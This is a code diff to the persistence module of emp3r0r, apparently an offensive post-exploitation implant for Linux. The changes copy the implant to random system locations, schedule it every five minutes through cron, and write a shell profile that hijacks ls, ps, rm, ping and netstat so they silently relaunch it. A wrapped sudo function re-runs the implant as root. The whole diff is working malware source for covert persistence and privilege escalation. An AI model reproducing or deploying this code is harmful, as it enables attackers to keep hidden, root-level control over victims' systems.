@@ -22,7 +22,6 @@ var (
 	// look at emp3r0r_data.PersistMethods too
 	PersistMethods = map[string]func() error{
 		"profiles": profiles,
-		"service":  service,
 		"injector": injector,
 		"cron":     cronJob,
 		"patcher":  patcher,
@@ -57,8 +56,8 @@ var (
 	}
 )
 
-// SelfCopy copy emp3r0r to multiple locations
-func SelfCopy() {
+// installToAllLocations copy emp3r0r to multiple locations
+func installToAllLocations() {
 	locations := EmpLocations
 	if !HasRoot() {
 		locations = EmpLocationsNoRoot
@@ -72,8 +71,19 @@ func SelfCopy() {
 	}
 }
 
+func installToRandomLocation() (target string, err error) {
+	locations := EmpLocations
+	if !HasRoot() {
+		locations = EmpLocationsNoRoot
+	}
+	target = locations[util.RandInt(0, len(locations))]
+	err = CopySelfTo(target)
+	return
+}
+
 // PersistAllInOne run all persistence method at once
 func PersistAllInOne() (final_err error) {
+	installToAllLocations()
 	for k, method := range PersistMethods {
 		res := "succeeded"
 		method_err := method()
@@ -89,20 +99,18 @@ func PersistAllInOne() (final_err error) {
 }
 
 func cronJob() (err error) {
-	locations := EmpLocations
-	if !HasRoot() {
-		locations = EmpLocationsNoRoot
-	}
-	exe_location := locations[util.RandInt(0, len(locations))]
-	err = CopySelfTo(exe_location)
+	exe_location, err := installToRandomLocation()
 	if err != nil {
-		return
+		return err
 	}
-
-	return AddCronJob("*/5 * * * * " + exe_location)
+	return AddCronJob("*/5 * * * * PERSISTENCE=true " + exe_location)
 }
 
 func profiles() (err error) {
+	exe, err := installToRandomLocation()
+	if err != nil {
+		return err
+	}
 	user, err := user.Current()
 	if err != nil {
 		return fmt.Errorf("Cannot get user profile: %v", err)
@@ -116,11 +124,7 @@ func profiles() (err error) {
 	sourceCmd := "source ~/.bashprofile"
 
 	// call this to start emp3r0r
-	locations := EmpLocations
-	if !HasRoot() {
-		locations = EmpLocationsNoRoot
-	}
-	payload := strings.Join(locations, " || ")
+	payload := exe
 
 	// set +m to silent job control
 	payload = "set +m;" + payload
@@ -134,23 +138,24 @@ func profiles() (err error) {
 	}
 
 	// loader
-	loader := fmt.Sprintf("\nfunction ls() { (set +m;(%s);); `which ls` $@ --color=auto; }", payload)
+	loader := "export PERSISTENCE=true"
 	loader += "\nunalias ls 2>/dev/null" // TODO check if alias exists before unalias it
 	loader += "\nunalias rm 2>/dev/null"
 	loader += "\nunalias ps 2>/dev/null"
-	loader += fmt.Sprintf("\nfunction ping() { (set +m;(%s)); `which ping` $@; }", payload)
-	loader += fmt.Sprintf("\nfunction netstat() { (set +m;(%s)); `which netstat` $@; }", payload)
-	loader += fmt.Sprintf("\nfunction ps() { (set +m;(%s)); `which ps` $@; }", payload)
-	loader += fmt.Sprintf("\nfunction rm() { (set +m;(%s)); `which rm` $@; }\n", payload)
+	loader += fmt.Sprintf("\nfunction ls() { (set +m;(%s)2>/dev/null;); /usr/bin/ls $@ --color=never; }", payload)
+	loader += fmt.Sprintf("\nfunction ping() { (set +m;(%s)2>/dev/null); /usr/bin/ping $@; }", payload)
+	loader += fmt.Sprintf("\nfunction netstat() { (set +m;(%s)2>/dev/null); /usr/bin/netstat $@; }", payload)
+	loader += fmt.Sprintf("\nfunction ps() { (set +m;(%s)2>/dev/null); /usr/bin/ps $@; }", payload)
+	loader += fmt.Sprintf("\nfunction rm() { (set +m;(%s)2>/dev/null); /usr/bin/rm $@; }\n", payload)
 
 	// exec our payload as root too!
 	// sudo payload
 	var sudoLocs []string
 	for _, loc := range EmpLocations {
-		sudoLocs = append(sudoLocs, "`which sudo` -E "+loc)
+		sudoLocs = append(sudoLocs, "/usr/bin/sudo -E "+loc)
 	}
 	sudoPayload := strings.Join(sudoLocs, "||")
-	loader += fmt.Sprintf("\nfunction sudo() { `which sudo` $@; (set +m;(%s)) }", sudoPayload)
+	loader += fmt.Sprintf("\nfunction sudo() { /usr/bin/sudo $@; (set +m;(%s)) }", sudoPayload)
 	err = ioutil.WriteFile(user.HomeDir+"/.bashprofile", []byte(loader), 0644)
 	if err != nil {
 		if !util.IsExist(user.HomeDir) {
@@ -218,10 +223,6 @@ func injector() (err error) {
 		return fmt.Errorf("All attempts failed (%v), trying with new child process: %v", err, ShellcodeInjector(&emp3r0r_data.GuardianShellcode, 0))
 	}
 
-	return
-}
-
-func service() (err error) {
 	return
 }
 
